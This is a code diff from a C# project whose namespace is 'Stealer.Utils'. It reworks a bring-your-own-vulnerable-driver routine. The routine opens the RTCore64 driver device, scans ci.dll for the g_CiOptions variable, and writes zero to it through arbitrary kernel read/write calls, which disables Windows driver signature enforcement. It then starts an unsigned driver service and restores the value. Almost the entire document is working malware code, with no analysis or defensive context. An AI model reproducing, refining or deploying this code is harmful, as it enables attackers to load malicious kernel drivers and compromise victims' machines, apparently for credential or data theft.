@@ -159,55 +159,71 @@ namespace Stealer.Utils
                     return false;
                 }
 
-                // 2. Find g_CiOptions kernel address
-                IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress();
-                if (gCiOptionsKernelAddr == IntPtr.Zero)
+                IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
+                    FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+
+                if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
                 {
-                    errorMsg = "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
+                    errorMsg = "BYOVD: Failed to open device handle \\\\.\\RTCore64";
                     return false;
                 }
 
-                // 3. Read original g_CiOptions
-                uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
-
-                // Write 0 to disable DSE on g_CiOptions and adjacent g_CiEnabled
-                if (!WriteKernelMemory32(gCiOptionsKernelAddr, 0))
-                {
-                    errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
-                    return false;
-                }
-
-                // Also attempt write to adjacent g_CiEnabled location if present
-                WriteKernelMemory32(new IntPtr(gCiOptionsKernelAddr.ToInt64() - 4), 0);
-
-                // Verification read after write
-                uint checkOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
-
-                bool started = false;
                 try
                 {
-                    started = StartService(hSvc, 0, null);
-                    if (!started)
+                    // 2. Find g_CiOptions kernel address
+                    IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress(hDev);
+                    if (gCiOptionsKernelAddr == IntPtr.Zero)
                     {
-                        int sErr = Marshal.GetLastWin32Error();
-                        if (sErr == 1056) started = true;
-                        else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ", addr=0x" + gCiOptionsKernelAddr.ToString("X") + ", orig=" + originalOptions + ", check=" + checkOptions + ")";
+                        errorMsg = "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
+                        return false;
                     }
+
+                    // 3. Read original g_CiOptions
+                    uint originalOptions = ReadKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr);
+
+                    // Write 0 to disable DSE on g_CiOptions and adjacent g_CiEnabled
+                    if (!WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, 0))
+                    {
+                        errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
+                        return false;
+                    }
+
+                    // Also attempt write to adjacent g_CiEnabled location if present
+                    WriteKernelMemory32WithHandle(hDev, new IntPtr(gCiOptionsKernelAddr.ToInt64() - 4), 0);
+
+                    // Verification read after write
+                    uint checkOptions = ReadKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr);
+
+                    bool started = false;
+                    try
+                    {
+                        started = StartService(hSvc, 0, null);
+                        if (!started)
+                        {
+                            int sErr = Marshal.GetLastWin32Error();
+                            if (sErr == 1056) started = true;
+                            else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ", addr=0x" + gCiOptionsKernelAddr.ToString("X") + ", orig=" + originalOptions + ", check=" + checkOptions + ")";
+                        }
+                    }
+                    finally
+                    {
+                        // 4. Restore original g_CiOptions value
+                        if (originalOptions != 0)
+                        {
+                            WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, originalOptions);
+                        }
+                        else
+                        {
+                            WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, 6);
+                        }
+                    }
+
+                    return started;
                 }
                 finally
                 {
-                    // 4. Restore original g_CiOptions value
-                    if (originalOptions != 0)
-                    {
-                        WriteKernelMemory32(gCiOptionsKernelAddr, originalOptions);
-                    }
-                    else
-                    {
-                        WriteKernelMemory32(gCiOptionsKernelAddr, 6);
-                    }
+                    CloseHandle(hDev);
                 }
-
-                return started;
             }
             catch (Exception ex)
             {
@@ -321,7 +337,41 @@ namespace Stealer.Utils
             return true;
         }
 
-        private static IntPtr FindGCiOptionsAddress()
+        private static bool GetModuleDataSection(IntPtr userBase, out uint dataRva, out uint dataSize)
+        {
+            dataRva = 0;
+            dataSize = 0;
+            try
+            {
+                int e_lfanew = Marshal.ReadInt32(new IntPtr(userBase.ToInt64() + 0x3C));
+                IntPtr ntHeaders = new IntPtr(userBase.ToInt64() + e_lfanew);
+                ushort numberOfSections = (ushort)Marshal.ReadInt16(new IntPtr(ntHeaders.ToInt64() + 0x06));
+                ushort sizeOfOptionalHeader = (ushort)Marshal.ReadInt16(new IntPtr(ntHeaders.ToInt64() + 0x14));
+                IntPtr sectionHeader = new IntPtr(ntHeaders.ToInt64() + 0x18 + sizeOfOptionalHeader);
+
+                for (int i = 0; i < numberOfSections; i++)
+                {
+                    IntPtr sec = new IntPtr(sectionHeader.ToInt64() + (i * 40));
+                    string secName = "";
+                    for (int j = 0; j < 8; j++)
+                    {
+                        byte b = Marshal.ReadByte(sec, j);
+                        if (b == 0) break;
+                        secName += (char)b;
+                    }
+                    if (string.Equals(secName, ".data", StringComparison.OrdinalIgnoreCase))
+                    {
+                        dataSize = (uint)Marshal.ReadInt32(sec, 8);
+                        dataRva = (uint)Marshal.ReadInt32(sec, 12);
+                        return true;
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+
+        private static IntPtr FindGCiOptionsAddress(IntPtr hDev)
         {
             IntPtr ciKernelBase = GetKernelModuleBase("ci.dll");
             if (ciKernelBase == IntPtr.Zero)
@@ -336,17 +386,20 @@ namespace Stealer.Utils
 
             try
             {
+                uint dataRva = 0, dataSize = 0;
+                GetModuleDataSection(userCiBase, out dataRva, out dataSize);
+
                 IntPtr ciInitializeAddr = GetProcAddress(userCiBase, "CiInitialize");
                 IntPtr gCiOptionsKernelAddr = IntPtr.Zero;
 
                 if (ciInitializeAddr != IntPtr.Zero)
                 {
-                    gCiOptionsKernelAddr = ScanForGCiOptions(ciInitializeAddr, 0x1000, userCiBase, ciKernelBase);
+                    gCiOptionsKernelAddr = ScanForGCiOptions(ciInitializeAddr, 0x1000, userCiBase, ciKernelBase, hDev, dataRva, dataSize);
                 }
 
                 if (gCiOptionsKernelAddr == IntPtr.Zero)
                 {
-                    gCiOptionsKernelAddr = ScanModuleForGCiOptionsPattern(userCiBase, ciKernelBase);
+                    gCiOptionsKernelAddr = ScanModuleForGCiOptionsPattern(userCiBase, ciKernelBase, hDev, dataRva, dataSize);
                 }
 
                 return gCiOptionsKernelAddr;
@@ -395,10 +448,13 @@ namespace Stealer.Utils
             return IntPtr.Zero;
         }
 
-        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset, IntPtr userCiBase, IntPtr ciKernelBase)
+        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset, IntPtr userCiBase, IntPtr ciKernelBase, IntPtr hDev, uint dataRva, uint dataSize)
         {
             byte[] code = new byte[maxOffset];
             Marshal.Copy(baseAddr, code, 0, maxOffset);
+
+            IntPtr dataKernelStart = (dataRva != 0) ? new IntPtr(ciKernelBase.ToInt64() + dataRva) : IntPtr.Zero;
+            IntPtr dataKernelEnd = (dataRva != 0) ? new IntPtr(dataKernelStart.ToInt64() + dataSize) : IntPtr.Zero;
 
             // Pattern 1: mov dword ptr [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
             for (int i = 0; i < maxOffset - 10; i++)
@@ -413,10 +469,10 @@ namespace Stealer.Utils
                     long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                     IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
 
-                    uint val = ReadKernelMemory32(cand);
-                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
                     {
-                        return cand;
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                        if (val != 0) return cand;
                     }
                 }
             }
@@ -432,10 +488,10 @@ namespace Stealer.Utils
                     long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                     IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
 
-                    uint val = ReadKernelMemory32(cand);
-                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
                     {
-                        return cand;
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                        if (val != 0) return cand;
                     }
                 }
             }
@@ -451,10 +507,10 @@ namespace Stealer.Utils
                     long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                     IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
 
-                    uint val = ReadKernelMemory32(cand);
-                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
                     {
-                        return cand;
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                        if (val != 0) return cand;
                     }
                 }
             }
@@ -462,7 +518,7 @@ namespace Stealer.Utils
             return IntPtr.Zero;
         }
 
-        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase, IntPtr ciKernelBase)
+        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase, IntPtr ciKernelBase, IntPtr hDev, uint dataRva, uint dataSize)
         {
             string[] exports = new string[] {
                 "CiInitialize",
@@ -476,7 +532,7 @@ namespace Stealer.Utils
                 IntPtr exportAddr = GetProcAddress(userBase, exp);
                 if (exportAddr != IntPtr.Zero)
                 {
-                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000, userBase, ciKernelBase);
+                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000, userBase, ciKernelBase, hDev, dataRva, dataSize);
                     if (target != IntPtr.Zero) return target;
                 }
             }
@@ -484,23 +540,16 @@ namespace Stealer.Utils
             try
             {
                 IntPtr textSection = new IntPtr(userBase.ToInt64() + 0x1000);
-                return ScanForGCiOptions(textSection, 0x30000, userBase, ciKernelBase);
+                return ScanForGCiOptions(textSection, 0x30000, userBase, ciKernelBase, hDev, dataRva, dataSize);
             }
             catch { }
 
             return IntPtr.Zero;
         }
 
-        private static uint ReadKernelMemory32(IntPtr kernelAddr)
+        private static uint ReadKernelMemory32WithHandle(IntPtr hDev, IntPtr kernelAddr)
         {
-            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
-                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-
-            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
-            {
-                return 0;
-            }
-
+            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1)) return 0;
             try
             {
                 RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
@@ -521,21 +570,13 @@ namespace Stealer.Utils
                 }
                 finally { Marshal.FreeHGlobal(pReq); }
             }
-            finally { CloseHandle(hDev); }
-
+            catch { }
             return 0;
         }
 
-        private static bool WriteKernelMemory32(IntPtr kernelAddr, uint value)
+        private static bool WriteKernelMemory32WithHandle(IntPtr hDev, IntPtr kernelAddr, uint value)
         {
-            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
-                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-
-            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
-            {
-                return false;
-            }
-
+            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1)) return false;
             try
             {
                 RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
@@ -553,7 +594,7 @@ namespace Stealer.Utils
                 }
                 finally { Marshal.FreeHGlobal(pReq); }
             }
-            finally { CloseHandle(hDev); }
+            catch { return false; }
         }
     }
 }
